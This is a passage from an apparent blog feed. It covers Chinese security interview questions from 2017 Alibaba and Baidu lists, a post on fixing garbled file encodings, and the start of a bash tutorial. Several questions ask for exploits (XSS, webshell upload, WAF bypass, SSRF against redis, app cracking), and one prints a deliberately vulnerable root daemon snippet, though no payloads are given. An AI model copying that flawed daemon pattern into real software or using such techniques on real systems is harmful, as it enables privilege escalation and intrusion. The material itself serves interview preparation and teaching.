eax</span><br><span class="line">                mov     rax, [rbp+n+4]</span><br><span class="line">                add     rcx, rax</span><br><span class="line">                mov     rax, [rbp+src]</span><br><span class="line">                mov     rsi, rax  </span><br><span class="line">                mov     rdi, rcx       </span><br><span class="line">                call    _memcpy</span><br><span class="line">                add     dword ptr [rbp+size+4], 1</span><br><span class="line"> </span><br><span class="line">loc_400605:</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_21</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">现有办公网、生产网各一份DNS服务器采集的DNS日志，</span><br><span class="line">包括时间、请求域名domain、请求类型type、返回值value、源IP、源端口信息。</span><br><span class="line">根据这两份数据，分别阐述你可以产出什么类型的安全告警，并作简要思路说明。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_22</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Objective-C语言里的isa是什么？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_23</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有什么利弊？小明周末去星巴克喝咖啡，回到家后，发现他的微博帐号被人盗用了。请问可能发生什么事情了，原理是什么，如何防范</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_24</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分别介绍下method-swizzling和isa-swizzling，以及它们通常用在什么场景下？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_25</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">淘宝日常流量中有一部分不法人员通过机器批量秒杀商品，</span><br><span class="line">或者通过web安全技术对阿里的系统进行攻击盗取账号等，对消费者和商家造成一定危害，</span><br><span class="line">如果现在要你通过一套算法体系准确区分出正常流量和恶意流量？</span><br><span class="line">如果有对正常流量的错分类，该如何做？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_26</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请说出至少3个IOT设备使用的网络通信协议，并简述其特点。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_27</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述cloudbleed漏洞的主要成因。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_28</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">如下是某司批量执行普通员工提交任务的守护进程，普通员工通过创建文件&#x2F;opt&#x2F;task&#x2F;tasklist.sh提交任务，其核心逻辑如下:</span><br><span class="line">struct stat info;</span><br><span class="line">stat(&quot;&#x2F;opt&#x2F;task&#x2F;tasklist.sh&quot;, &amp;info);</span><br><span class="line">setgid(info.st_gid);</span><br><span class="line">setuid(info.st_uid);</span><br><span class="line">system(&quot;&#x2F;opt&#x2F;task&#x2F;tasklist.sh&quot;);</span><br><span class="line">该进程运行时状态如下:</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root      4337  3977  0 15:29 pts&#x2F;2    00:00:00  supervisor</span><br><span class="line">该程序存在严重漏洞，请给出exploit。</span><br><span class="line">请分析该代码违反哪些安全编码原则?如何设计自动化审计程序发现所有代码中存在的问题?</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_29</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_30</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">某非著名购物网站最近发现总是收到用户投诉订单信息被泄漏，</span><br><span class="line">网站安全专家严格排查了服务器和数据库的日志，没有发现入侵迹象，</span><br><span class="line">但发现在web访问日志有一个用户访问订单页面的次数非常多而且url中的订单号是连续的，</span><br><span class="line">网站安全专家马上明白了问题所在，</span><br><span class="line">请问安全专家明白了什么？这个问题如何解决？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_31</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个blog系统中如果需要使用富文本编辑器，</span><br><span class="line">用来展示图片、不同的字体和格式需要使用html中的富文本标签例如&lt;img&gt;等，</span><br><span class="line">在这种场景下，可能会存在哪些方面的安全风险，应该如何进行防御？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">对于如下模版：</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var s&#x3D;&#39;$&#123;a&#125;&#39;+&#39;$&#123;b&#125;&#39;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">其中a,b为用户输入的参数，过滤了单引号和尖括号，是否存在xss漏洞，若存在给出利用代码</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_33</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_34</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请列出黑客绕过WAF的安全防护的方法，并简述如何实现？</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_35</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">比特币挖矿软件的常用协议有哪些, </span><br><span class="line">如何在网络层去检测挖矿行为, 给出检测方案.</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_36</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">给了一段android权限的xml, 要求描述可能操作</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_37</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">botnet有哪些威胁 如何检测 如何解决</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_38</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器代理技术分为哪几类? 在安全上分别有怎样的应用? 分别面临怎样的安全风险?</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_39</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过Fuzz对某个开源工具进行漏洞挖掘，</span><br><span class="line">如果使用该工具进行Fuzz并长时间未能得到任何结果， </span><br><span class="line">应该如何诊断问题并改进Fuzz方法</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_40</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请写出一个尽可能完整的http请求包，并分析哪些字段可用作攻击，写出具体的场景和对应的安全风险。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_41</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">日常生活中用算法解决了什么问题</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_42</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">为了通过日志排查营销活动中批量小号抽奖的行为， </span><br><span class="line">请设计需要获取的事件格式，并且制定识别策略。</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_43</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">逆向工具打开一个APK的dex, 发现所有类名都是a b v a$a 之类的。</span><br><span class="line">这种命名是如何实现的, 针对这种命名, 如何进行高效的逆向分析?</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_44</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前IOT设备存在哪些安全问题, 硬件+软件 如何防御</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_45</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黑客入侵以后, 加密所有数据对使用者进行勒索, 从os和sql考虑如何防御.</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_46</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">基于docker容器技术为客户提供服务, 看服务器运行docker容器时的进程信息, 分析服务器平台自身是否存在风险</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_47</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">某LNMP架构的大型网站存在文件包含漏洞, 没有上传点, </span><br><span class="line">如何利用该弱点上传webshell, 如何防御</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_48</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如何实现一个被动web扫描器, 要有亮点功能</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_ali_spring_49</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IoT攻防和普通计算机网络攻防的区别</span><br><span class="line">&lt;!&gt; 具体题干未知.</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请回答如下端口默认对应的服务，以及在渗透测试过程中我们可以从哪些角度考虑其安全问题。</span><br><span class="line">端口：21、22、873、1433、3306、6379、11211</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你所知道的网络抓包工具有哪些？对android或者ios设备怎么进行抓包。</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请说明黑客常用的清除痕迹的方式及对应的监控方法（linux和windows系统）</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">罗列最近几年影响较大的安全漏洞并请大概介绍其原理、危害（请列举3个）</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">介绍你所知道的加密算法，都属于什么类型的加密算法？怎么保证加密的安全性？</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP中了解有哪些容易导致漏洞的危险函数？并且简述会造成什么类型的风险</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件包含漏洞的常见WAF绕过方式（以读取&#x2F;etc&#x2F;passwd为例）</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">现有一个需要注册才能使用的Android APP，打开APP时，</span><br><span class="line">显示：请输入正确的序列号。如序列号不正确，提示：你输入的序列号错误。</span><br><span class="line">问：如何对该APP进行分析破解，用最简单的，使之输入任意序列号即可使用。</span><br><span class="line">请描述分析方法、使用工具</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请描述PE文件加壳、脱壳步骤？</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_9</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCP三次握手的原理，并简单描述下端口扫描的几种实现方式及优缺点</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_10</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有N个大小不等的自然数（1–N），乱序存于数组从1到n下标的空间中，</span><br><span class="line">请将它们由小到大排序，不能直接赋值或输出。</span><br><span class="line">要求程序算法：时间复杂度为O(n)，空间复杂度为O(1)。</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_11</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对任意输入的正整数N，编写C程序求N!的尾部连续0的个数，并指出计算复杂度。</span><br><span class="line">如：17！＝355687428096000，尾部连续0的个数是3。</span><br><span class="line">（不用考虑数值超出计算机整数界限的问题</span><br></pre></td></tr></table></figure></li><li><p>2017_baidu_spring_12</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">从其他渠道获知A站被黑，同时黑客上传了webshell（是否被黑客删除未知），</span><br><span class="line">该服务器上没有任何安全防御措施，只有web访问日志。</span><br><span class="line">假如你是安全工程师小王，请你说明如何排查快速定位问题点，</span><br><span class="line">同时设计有效的安全防御系统，防范类似情况发生，</span><br><span class="line">防御系统至少包括sql注入、上传webshell等高危漏洞的防御措施。</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;在SSRF漏洞中利用gopher协议攻击redis进行getshell，如何构造payload，写出操作步骤&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;s
      
    
    </summary>
    
    
      <category term="面经总结" scheme="http://yoursite.com/categories/%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="面经" scheme="http://yoursite.com/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>文件乱码</title>
    <link href="http://yoursite.com/2020/02/26/%E6%96%87%E4%BB%B6%E4%B9%B1%E7%A0%81/"/>
    <id>http://yoursite.com/2020/02/26/%E6%96%87%E4%BB%B6%E4%B9%B1%E7%A0%81/</id>
    <published>2020-02-26T02:54:27.000Z</published>
    <updated>2020-02-27T09:05:01.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-文件内容乱码。"><a href="#1-文件内容乱码。" class="headerlink" title="1 文件内容乱码。"></a>1 文件内容乱码。</h1><h2 id="1-1-错误描述"><a href="#1-1-错误描述" class="headerlink" title="1.1 错误描述"></a>1.1 错误描述</h2><p>用vim或其他编辑软件打开文件显示乱码。</p><h2 id="1-2-产生原因"><a href="#1-2-产生原因" class="headerlink" title="1.2 产生原因"></a>1.2 产生原因</h2><p>Linux显示在Windows编辑过的中文就会显示乱码是由于两个操作系统使用的编码不同所致。Linux下使用的编码是utf8，而Windows使用的是gb18030。因此，解决Linux打开txt文件中文乱码可有如下两种方法。</p><h2 id="1-3-解决方案"><a href="#1-3-解决方案" class="headerlink" title="1.3 解决方案"></a>1.3 解决方案</h2><ol><li>在附件终端中，进入到txt文件所在目录，使用命令符“iconv -f gb18030 -t utf8 old.txt -o new.txt”把gb18030编码的old.txt转换成utf8的new.txt。这样new.txt就成为Linux支持的编码。</li><li>在附件终端中,使用命令符“gconf-editor”，进入环境配置，依次展开“/apps/gedit-2/preferences/encodings/”，编辑右侧的“auto_detected”将“gb18030”添加到最顶上。以后文本编辑器就可以正常显示中文了。</li></ol><h1 id="2-文件名乱码"><a href="#2-文件名乱码" class="headerlink" title="2 文件名乱码"></a>2 文件名乱码</h1><h2 id="错误描述"><a href="#错误描述" class="headerlink" title="错误描述"></a>错误描述</h2><p>在linux下面显示发现文件名乱码</p><h2 id="2-2产生原因"><a href="#2-2产生原因" class="headerlink" title="2.2产生原因"></a>2.2产生原因</h2><p>编码不一样。</p><h2 id="2-3-解决方案"><a href="#2-3-解决方案" class="headerlink" title="2.3 解决方案"></a>2.3 解决方案</h2><ol><li><p>此时做一个转码操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">convmv --notest --nosmart -f gbk -t utf8 -r 文件或者目录</span><br><span class="line"></span><br><span class="line">－f from从什么编码</span><br><span class="line">－t to改成什么编码</span><br><span class="line">--nosmart 如果已经是utf－8 忽略</span><br><span class="line">-r 包含所有子目录</span><br><span class="line"></span><br><span class="line">--notest 不加表示只列出有什么需要转换的，不做实际转换，所以一定要加</span><br></pre></td></tr></table></figure></li></ol><h1 id="3-shell脚本"><a href="#3-shell脚本" class="headerlink" title="3 shell脚本"></a>3 shell脚本</h1><p>另外一种就是平时写的sell脚本，在window那边传过来需要转码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dos2unix  xxx.sh</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-文件内容乱码。&quot;&gt;&lt;a href=&quot;#1-文件内容乱码。&quot; class=&quot;headerlink&quot; title=&quot;1 文件内容乱码。&quot;&gt;&lt;/a&gt;1 文件内容乱码。&lt;/h1&gt;&lt;h2 id=&quot;1-1-错误描述&quot;&gt;&lt;a href=&quot;#1-1-错误描述&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="错误解决" scheme="http://yoursite.com/categories/%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="文件处理" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>shell手册</title>
    <link href="http://yoursite.com/2020/02/26/shell%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/2020/02/26/shell%E6%89%8B%E5%86%8C/</id>
    <published>2020-02-25T16:06:36.000Z</published>
    <updated>2020-02-25T16:09:13.213Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-变量"><a href="#1-变量" class="headerlink" title="1. 变量"></a>1. 变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">msg&#x3D;&quot;hello world&quot;</span><br><span class="line">echo $msg</span><br><span class="line">123</span><br></pre></td></tr></table></figure><blockquote><p><strong>变量名的命名须遵循如下规则：</strong></p><ul><li>命名只能使用英文字母，数字和下划线，首个字符不能以数字开头。</li><li>中间不能有空格，可以使用下划线（_）。</li><li>不能使用标点符号。</li><li>不能使用bash里的关键字（可用help命令查看保留关键字）。</li></ul></blockquote><h2 id="2-传参"><a href="#2-传参" class="headerlink" title="2. 传参"></a>2. 传参</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;执行的文件名：$0&quot;;</span><br><span class="line">echo &quot;第一个参数为：$1&quot;;</span><br><span class="line">echo &quot;第二个参数为：$2&quot;;</span><br><span class="line">echo &quot;第三个参数为：$3&quot;;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><blockquote><p><strong>脚本内获取参数的格式为：</strong><br>$n。n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……<br><strong>另外，还有几个特殊字符用来处理参数：</strong></p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>$#</code></td><td>传递到脚本的参数个数</td></tr><tr><td><code>$*</code></td><td>以一个单字符串显示所有向脚本传递的参数。 如<code>&quot;$*&quot;</code>用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。</td></tr><tr><td><code>$$</code></td><td>脚本运行的当前进程ID号</td></tr><tr><td><code>$!</code></td><td>后台运行的最后一个进程的ID号</td></tr><tr><td><code>$@</code></td><td>与<code>$*</code>相同，但是使用时加引号，并在引号中返回每个参数。 如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。</td></tr><tr><td><code>$-</code></td><td>显示Shell使用的当前选项，与set命令功能相同。</td></tr><tr><td><code>$?</code></td><td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table></blockquote><h2 id="3-数组"><a href="#3-数组" class="headerlink" title="3. 数组"></a>3. 数组</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">my_array&#x3D;(A B &quot;C&quot; D)</span><br><span class="line">echo &quot;第一个元素为: $&#123;my_array[0]&#125;&quot;</span><br><span class="line">echo &quot;第二个元素为: $&#123;my_array[1]&#125;&quot;</span><br><span class="line">echo &quot;第三个元素为: $&#123;my_array[2]&#125;&quot;</span><br><span class="line">echo &quot;第四个元素为: $&#123;my_array[3]&#125;&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;数组的元素为: $&#123;my_array[*]&#125;&quot;</span><br><span class="line">echo &quot;数组的元素为: $&#123;my_array[@]&#125;&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;数组元素个数为: $&#123;#my_array[*]&#125;&quot;</span><br><span class="line">echo &quot;数组元素个数为: $&#123;#my_array[@]&#125;&quot;</span><br><span class="line">123456789101112</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一个元素为: A</span><br><span class="line">第二个元素为: B</span><br><span class="line">第三个元素为: C</span><br><span class="line">第四个元素为: D</span><br><span class="line">数组的元素为: A B C D</span><br><span class="line">数组的元素为: A B C D</span><br><span class="line">数组元素个数为: 4</span><br><span class="line">数组元素个数为: 4</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><h2 id="4-基本运算符"><a href="#4-基本运算符" class="headerlink" title="4. 基本运算符"></a>4. 基本运算符</h2><blockquote><p>原生 bash 不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用。</p></blockquote><p>expr 是一款表达式计算工具，使用它能完成表达式的求值操作。</p><h3 id="①-算数运算符"><a href="#①-算数运算符" class="headerlink" title="① 算数运算符"></a>① 算数运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;2加2等于&quot;&#96;expr 2 + 2&#96;</span><br><span class="line">echo &quot;2减2等于&quot;&#96;expr 2 - 2&#96;</span><br><span class="line">echo &quot;2乘2等于&quot;&#96;expr 2 \* 2&#96;</span><br><span class="line">echo &quot;2除2等于&quot;&#96;expr 2 &#x2F; 2&#96;</span><br><span class="line">echo &quot;2除2取余&quot;&#96;expr 2 % 2&#96;</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><h3 id="②-关系运算符"><a href="#②-关系运算符" class="headerlink" title="② 关系运算符"></a>② 关系运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">a&#x3D;10</span><br><span class="line">b&#x3D;20</span><br><span class="line">if [ $a -eq $b ] # 检测两个数是否相等，相等返回 true。</span><br><span class="line">if [ $a -ne $b ] # 检测两个数是否不相等，不相等返回 true。</span><br><span class="line">if [ $a -gt $b ] # 检测左边的数是否大于右边的，如果是，则返回 true。</span><br><span class="line">if [ $a -lt $b ] # 检测左边的数是否小于右边的，如果是，则返回 true。</span><br><span class="line">if [ $a -ge $b ] # 检测左边的数是否大于等于右边的，如果是，则返回 true。</span><br><span class="line">if [ $a -le $b ] # 检测左边的数是否小于等于右边的，如果是，则返回 true。</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure><h3 id="③-布尔运算符"><a href="#③-布尔运算符" class="headerlink" title="③ 布尔运算符"></a>③ 布尔运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">if [ ! false ]       # 非运算，返回 true</span><br><span class="line">if [ true -o false ] # 或运算，返回 true</span><br><span class="line">if [ true -a false ] # 与运算，返回 false</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><h3 id="④-逻辑运算符"><a href="#④-逻辑运算符" class="headerlink" title="④ 逻辑运算符"></a>④ 逻辑运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">a&#x3D;10</span><br><span class="line">b&#x3D;20</span><br><span class="line">if [[ $a -lt $b &amp;&amp; $a -gt $b ]]   # 逻辑的 AND, 返回 false</span><br><span class="line">if [ $a -lt $b ] &amp;&amp; [ $a -gt $b ] # 逻辑的 AND, 返回 false</span><br><span class="line">if [[ $a -lt $b || $a -gt $b ]]   # 逻辑的 OR, 返回 true</span><br><span class="line">if [ $a -lt $b ] || [ $a -gt $b ] # 逻辑的 OR, 返回 true</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure><h3 id="⑤-字符串运算符"><a href="#⑤-字符串运算符" class="headerlink" title="⑤ 字符串运算符"></a>⑤ 字符串运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">a&#x3D;&quot;abc&quot;</span><br><span 